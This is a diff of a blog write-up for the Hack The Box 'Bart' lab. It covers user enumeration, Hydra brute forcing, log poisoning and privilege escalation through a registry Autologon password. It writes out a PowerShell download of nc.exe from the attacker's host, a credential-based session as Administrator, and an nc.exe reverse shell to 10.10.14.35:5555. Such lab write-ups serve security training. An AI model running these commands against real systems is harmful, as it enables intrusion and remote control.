@@ -1,6 +1,6 @@
 ---
 layout: post
-title:  "Hack The Box Bart writeup (w/o Metasploit)"
+title:  "Hack The Box - Bart writeup (privEsc with Autologin)"
 date:   2020-01-16 11:27:00 -0400
 featured_img: "/assets/bart/bart-10.10.10.81.png"
 categories: Bart HTB Windows
@@ -10,7 +10,7 @@ categories: Bart HTB Windows
 
 ![Bart](/assets/bart/bart-10.10.10.81.png)
 
-Majority of the machines I've been working on are Windows machines. I was practicing a lot recently on Windows Priv Esc and Bart machine is a good example.
+Majority of the machines I've been working on were Windows machines. I wanted to practice more Windows Priv Esc and Bart machine is a good example.
 
 So... Let's start
 
@@ -67,57 +67,57 @@ We can add add  `10.10.10.81 bart.htb forum.bart.htb` to `/etc/hosts` file.
 
 Let start with `forum.bart.htb`
 
-![dirsearch](/assets/bart/forum-10.10.10.81.png)
+![forum](/assets/bart/forum-10.10.10.81.png)
 
-We can see several persons here.
+We can see several people here.
 
-There is also one hidden inside page source
+There is also one person hidden inside page source
 
-![dirsearch](/assets/bart/forum-html-10.10.10.81.png)
+![html](/assets/bart/forum-html-10.10.10.81.png)
 
 
 There is also /monitor page
 
 Let's go there
 
-![dirsearch](/assets/bart/monitor-10.10.10.81.png)
+![monitor](/assets/bart/monitor-10.10.10.81.png)
 
 
 We can try to guess passwords. `admin:admin` did not work. We have Forgot password here. This may help us guess users.
 
 Will try `user` first
 
-![dirsearch](/assets/bart/forgot1-10.10.10.81.png)
+![forgot](/assets/bart/forgot1-10.10.10.81.png)
 
 `The provided username could not be found.`
 
-![dirsearch](/assets/bart/forgot2-10.10.10.81.png)
+![forgot](/assets/bart/forgot2-10.10.10.81.png)
 
-But what about one of the persons we found on forum page.
+But what about one of the people we found on forum page.
 
 We can try `harvey`
 
-![dirsearch](/assets/bart/forgot3-10.10.10.81.png)
+![forgot](/assets/bart/forgot3-10.10.10.81.png)
 
 Success
 
-![dirsearch](/assets/bart/forgot4-10.10.10.81.png)
+![forgot](/assets/bart/forgot4-10.10.10.81.png)
 
 After some trial and error the passwords turns out to be `potter`
 
 So we are in.
 
-![dirsearch](/assets/bart/monitor2-10.10.10.81.png)
+![monitor](/assets/bart/monitor2-10.10.10.81.png)
 
 But all we can see is the new subdomain `internal-01`
 
-![dirsearch](/assets/bart/monitor3-10.10.10.81.png)
+![monitor](/assets/bart/monitor3-10.10.10.81.png)
 
 Let's add it to hosts file as well.
 
 Open it in browser
 
-![dirsearch](/assets/bart/internal-10.10.10.81.png)
+![internal](/assets/bart/internal-10.10.10.81.png)
 
 Assuming the user is harvey, let's brute force our way in.
 
@@ -135,14 +135,14 @@ Hydra is the right tool for this
 
 `:Password` is the key word we see when login is not succcessdul. In our case it is either `Invalid Username or Password` or `The Password must be at least 8 characters` Since `Password` is seen in both cases we can specify just it
 
-![dirsearch](/assets/bart/internal-fail1-10.10.10.81.png)
+![internal](/assets/bart/internal-fail1-10.10.10.81.png)
 
-![dirsearch](/assets/bart/internal-fail2-10.10.10.81.png)
+![internal](/assets/bart/internal-fail2-10.10.10.81.png)
 
 
 Run Hydra
 
-![dirsearch](/assets/bart/hydra-10.10.10.81.png)
+![hydra](/assets/bart/hydra-10.10.10.81.png)
 
 We got password: Password1
 
@@ -152,13 +152,13 @@ And so we are in
 
 According to chat harvey messed something up. Let's check page source.
 
-![dirsearch](/assets/bart/logging-10.10.10.81.png)
+![logging](/assets/bart/logging-10.10.10.81.png)
 
 This looks very interesting `http://internal-01.bart.htb/log/log.php?filename=log.txt&username=harvey`
 
 It seems to be storing logs into log.txt file.
 
-![dirsearch](/assets/bart/logging2-10.10.10.81.png)
+![logging](/assets/bart/logging2-10.10.10.81.png)
 
 We can do log poisoning.
 
@@ -233,12 +233,17 @@ We can look for Autologon in registry
 
 ![winlogon](/assets/bart/autologin-10.10.10.81.png)
 
-we found password for Administrator `3130438f31186fbaf962f407711faddb`
+We found password for Administrator `3130438f31186fbaf962f407711faddb`
 
-In windows we can't simple swith to another user so we need to do runas workaround here.
+In windows we can't simply switch to another user so we need to do runas workaround here.
+
+First let's upload nc.exe (netcat). We will need it later.
+
+`Invoke-WebRequest -o nc.exe http://10.10.14.35/nc.exe`
+
+Now execute the following PowerShell commands .
 
 {% highlight powershell %}
-powershell.exe
 $username = 'BART\Administrator'
 $securePassword = ConvertTo-SecureString -AsPlainText -Force '3130438f31186fbaf962f407711faddb'
 $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword
@@ -247,18 +252,24 @@ Enter-PSSession -ComputerName localhost -Credential $credential
 
 ![runas](/assets/bart/runas-10.10.10.81.png)
 
-Okay, let's upload nc.exe (netcat)
-
-`Invoke-WebRequest -o nc.exe http://10.10.14.35/nc.exe`
-
 Craete new reverse shell with netcat
 
-`cmd.exe /c "C:\inetpub\wwwroot\internal-01\log\nc.exe 10.10.14.35 5555 -e cmd.exe"`
+{% highlight shell %}
+cmd.exe /c "C:\inetpub\wwwroot\internal-01\log\nc.exe 10.10.14.35 5555 -e cmd.exe"
+{% endhighlight %}
 
 ![runas](/assets/bart/nc2-10.10.10.81.png)
 
-and we got root
+And we got admin account
 
 ![root](/assets/bart/root-10.10.10.81.png)
+
+And now we can get root.txt
+
+![root](/assets/bart/root2-10.10.10.81.png)
+
+and user.txt
+
+![user](/assets/bart/user-10.10.10.81.png)
 
 
